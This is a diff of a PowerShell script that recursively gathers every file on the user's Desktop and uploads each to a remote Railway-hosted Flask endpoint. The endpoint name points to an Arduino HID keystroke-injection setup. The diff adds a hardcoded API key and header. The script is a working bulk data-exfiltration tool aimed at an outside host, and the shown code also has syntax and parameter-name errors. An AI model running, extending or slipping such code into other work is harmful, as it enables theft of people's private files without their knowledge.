@@ -1,6 +1,17 @@
 # CONFIGURATION
 $DesktopPath = [Environment]::GetFolderPath("Desktop")
-$Url = "https://arduinohidtesting-production.up.railway.app/upload"  # Update this to your actual Railway URL
+
+# load env 
+Get-Content ".env" | ForEach-Object {
+    if ($_ -match "^\s*([^#][^=]+)=(.+)$") {
+        $name, $value = $matches[1], $matches[2]
+        Set-Variable -Name $name.Trim() -Value $value.Trim()
+    }
+}
+
+# this script is re-used across two applications I need to hardcode these in here anyways 
+$API_KEY = "aTHIS8is6The4API1Key$**"
+$URL = "https://arduinohidtesting-production.up.railway.app/upload"
 
 # Get all files recursively
 $Files = Get-ChildItem -Path $DesktopPath -Recurse -File
@@ -10,6 +21,7 @@ function Send-FileToFlask {
     param(
         [string]$Uri,
         [string]$FilePath
+        [string]$API_KEY
     )
     
     try {
@@ -30,6 +42,7 @@ function Send-FileToFlask {
         $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
         $fileName = [System.IO.Path]::GetFileName($FilePath)
         
+        $webClient.Headers.Add("X-API-Key", $API_KEY)
         $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
         
         # Construct the multipart form body
@@ -79,7 +92,7 @@ foreach ($File in $Files) {
         Write-Host "Uploading: $($File.FullName)"
         
         # This method is optimized for Flask servers and works across PowerShell versions
-        $result = Send-FileToFlask -Uri $Url -FilePath $File.FullName
+        $result = Send-FileToFlask -Uri $URL -FilePath $File.FullName -apiKey $API_KEY
         
         Write-Host "Uploaded: $($File.Name)"
         Write-Host "Server response: $result`n"
